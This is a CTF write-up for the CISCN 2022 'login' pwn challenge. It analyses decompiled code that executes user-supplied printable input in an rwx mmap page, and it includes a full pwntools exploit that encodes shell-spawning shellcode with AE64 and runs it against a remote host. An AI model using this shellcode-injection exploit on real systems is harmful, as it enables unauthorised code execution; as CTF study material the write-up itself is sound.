# ciscn 2022 pwn login normal

> challenge name: `examination`   level: 2(easy)    (need a printable amd64 shellcode)
>
> file: `login`, `libc-2.33.so`
>
> writeup writer: hexhex16@outlook.com    https://github.com/hex-16
>
> 体验很差，pwn要么很简单，要么太难了，这题是pwn唯一简单的一题。re学的太窄，题目比较非常规。

vul明显，整体逻辑就是输入正确的东西，让.bss上一个flag为1，然后就调用mmap创建一个权限为rwx的空间，内容可控，随后执行这块空间上的东西，唯一难点就是写入的内容得是可打印的，常规shellcode会有不可见字符，需要转换。

需要进一步学习的是，google到很多版本的amd64下的printable ascii shellcode都无法使用，不清楚具体原因，最后尝试到python的ae64可以打通。

# Program Logic

程序比较简单，不放i64了，贴主要代码：

`main`会持续调用`main_logic`, 重点在`opt2func`中。还需要注意的是，程序会把msg最后一个字符给清掉，所以得多输入一个字符。检查是否可打印和写入shellcode并执行的代码如下：

```c
   for ( i = 0; i < strlen(msg); ++i ) {
    if ( !isprint(msg[i]) && msg[i] != '\n' ) {
      puts("oh!");
      exit(-1);
    }
  } 
// ....................
if ( bss_flag ) {
    page_size = getpagesize();
    dest = (void *)(int)mmap((char *)&loc_FFE + 2, page_size, 7, 34, 0, 0LL);
    msg_len = strlen(msg);
    memcpy(dest, msg, msg_len);
    ((void (*)(void))dest)();
  }
```

其余代码如下

```cpp
unsigned __int64 __fastcall main_logic(const char *input_s)
{
  char *sa; // [rsp+8h] [rbp-48h]
  char *p2colon; // [rsp+8h] [rbp-48h]
  char *sc; // [rsp+8h] [rbp-48h]
  char *p2newline; // [rsp+8h] [rbp-48h]
  char opt_num; // [rsp+17h] [rbp-39h]
  int idx; // [rsp+1Ch] [rbp-34h]
  int bss_2plus1_idx_s_len; // [rsp+2Ch] [rbp-24h]
  void *msg_content; // [rsp+30h] [rbp-20h]
  char *bss_2_idx_s; // [rsp+38h] [rbp-18h]
  char *bss_2plus1_idx_s; // [rsp+40h] [rbp-10h]
  unsigned __int64 v13; // [rsp+48h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  memset(bss_str, 0, sizeof(bss_str));
  idx = 0;
  opt_num = 0;
  msg_content = 0LL;
  while ( !*input_s || *input_s != '\n' && (*input_s != '\r' || input_s[1] != '\n') )
  {
    if ( idx <= 5 )
      bss_str[2 * idx] = input_s;
    p2colon = strchr(input_s, ':');
    if ( !p2colon )
    {
      puts("error.");
      exit(1);
    }
    *p2colon = 0;
    for ( sc = p2colon + 1; *sc && (*sc == ' ' || *sc == '\r' || *sc == '\n' || *sc == '\t'); ++sc )
      *sc = 0;
    if ( !*sc )
    {
      puts("abort.");
      exit(2);
    }
    if ( idx <= 5 )
      bss_str[2 * idx + 1] = sc;
    p2newline = strchr(sc, '\n');
    if ( !p2newline )
    {
      puts("error.");
      exit(3);
    }
    *p2newline = 0;
    input_s = p2newline + 1;
    if ( *input_s == '\r' )
      *input_s++ = 0;
    bss_2_idx_s = (char *)bss_str[2 * idx];
    bss_2plus1_idx_s = (char *)bss_str[2 * idx + 1];
    if ( !strcasecmp(bss_2_idx_s, "opt") )      // strcasecmp return 0 means equal
    {
      if ( opt_num )
      {
        puts("error.");
        exit(5);
      }
      opt_num = atoi(bss_2plus1_idx_s);
    }
    else
    {
      if ( strcasecmp(bss_2_idx_s, "msg") )
      {
        puts("error.");
        exit(4);
      }
      if ( strlen(bss_2plus1_idx_s) <= 1 )
      {
        puts("error.");
        exit(5);
      }
      bss_2plus1_idx_s_len = strlen(bss_2plus1_idx_s) - 1;
      if ( msg_content )
      {
        puts("error.");
        exit(5);
      }
      msg_content = calloc(bss_2plus1_idx_s_len + 8, 1uLL);
      if ( bss_2plus1_idx_s_len <= 0 )
      {
        puts("error.");
        exit(5);
      }
      memcpy(msg_content, bss_2plus1_idx_s, bss_2plus1_idx_s_len);
    }
    ++idx;
  }
  *input_s = 0;
  sa = (char *)(input_s + 1);
  if ( *sa == '\n' )
    *sa = 0;
  switch ( opt_num )
  {
    case 2:
      opt2func((const char *)msg_content);
      break;
    case 3:
      opt3func((const char *)msg_content);      // "eX1t" reset 两个bss flag
      break;
    case 1:
      opt1func((const char *)msg_content);      // "ro0t" set 两个bss flag； 不是"ro0t" set flag2
      break;
    default:
      puts("error.");
      exit(6);
  }
  return __readfsqword(0x28u) ^ v13;
}
```

```cpp
unsigned __int64 __fastcall opt1func(const char *a1)
{
  int i; // [rsp+14h] [rbp-1Ch]
  unsigned __int64 v3; // [rsp+18h] [rbp-18h]

  v3 = __readfsqword(0x28u);
  for ( i = 0; i < strlen(a1); ++i )
  {
    if ( !isprint(a1[i]) && a1[i] != 10 )
    {
      puts("oh!");
      exit(-1);
    }
  }
  if ( !strcmp(a1, "ro0t") )
  {
    bss_flag2 = 1;
    bss_flag = 1;
  }
  else
  {
    bss_flag2 = 1;
  }
  return __readfsqword(0x28u) ^ v3;
}

unsigned __int64 __fastcall opt2func(const char *msg)
{
  unsigned int page_size; // eax
  size_t msg_len; // rax
  int i; // [rsp+14h] [rbp-2Ch]
  void *dest; // [rsp+18h] [rbp-28h]
  unsigned __int64 v6; // [rsp+28h] [rbp-18h]

  v6 = __readfsqword(0x28u);
  for ( i = 0; i < strlen(msg); ++i )
  {
    if ( !isprint(msg[i]) && msg[i] != '\n' )
    {
      puts("oh!");
      exit(-1);
    }
  }
  if ( bss_flag2 != 1 )
  {
    puts("oh!");
    exit(-1);
  }
  if ( bss_flag )
  {
    page_size = getpagesize();
    dest = (void *)(int)mmap((char *)&loc_FFE + 2, page_size, 7, 34, 0, 0LL);
    msg_len = strlen(msg);
    memcpy(dest, msg, msg_len);
    ((void (*)(void))dest)();
  }
  else
  {
    puts(msg);
  }
  return __readfsqword(0x28u) ^ v6;
}
```

# exp

https://github.com/veritas501/ae64 感谢veritas501开发的amd64 shellcode转换工具。目录中的ae64.py正是veritas501开发的amd64 shellcode转换工具，非常好用。

```python
from pwn import *
from ae64 import AE64

context.arch = "amd64"
context.log_level = "debug"
IP = "47.93.176.91"
PORT = 21780
DEBUG = 0

if DEBUG:
    p = process("./login")
    # p = process(["./ld-2.31.so", "./pwn"], env={"LD_PRELOAD": "./libc-2.31.so"})
    base = p.libs()[p._cwd + p.argv[0].decode().strip(".")]  # fix bytes str error in py3.9
    success("base:", base, p.libs())
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")  # for local libc heap pwn
else:
    p = remote(IP, PORT)  # flag{bd9edcaa-62ef-49bb-88ad-ed753f66999a}
    libc = ELF("./libc-2.33.so")


def ru(x): return p.recvuntil(x)
def se(x): return p.send(x)
def rl(): return p.recvline()
def sl(x): return p.sendline(x)
def rv(x): return p.recv(x)
def sa(a, b): return p.sendafter(a, b)
def sla(a, b): return p.sendlineafter(a, b)
def l64(): return u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))  # python 3.9 pass
def lg(s): return log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))


def debug(cmd=""):
    gdb.attach(p, cmd)


def dd():
    if DEBUG:
        cmd = ""
        # cmd += "b *%d\n" % (base + 0x0D5A)
        cmd += "b *%d\n" % (base + 0x0EB3)
        # cmd += "set $a=%d\n" % (base + 0x5080)  # arrPtr
        cmd += "c"
        debug(cmd)


dd()
sla(">>> ", b"opt:1\nmsg:ro0t \n")  # .ljust(0x3fe, "\0") # 多输入一个字符，避免t被清掉

shellcode = shellcraft.sh()  # shellcraft.amd64.linux.cat("flag")  #

enc_shellcode = AE64().encode(asm(shellcode), "rdi") # why rdi? i dont know. Try it
print("enc_shellcode:", enc_shellcode.decode('latin-1'), enc_shellcode)
sla(">>> ", b"opt:2\nmsg:" + enc_shellcode + b"Z\n") # Z表示nop 避免被清掉
p.interactive()

```

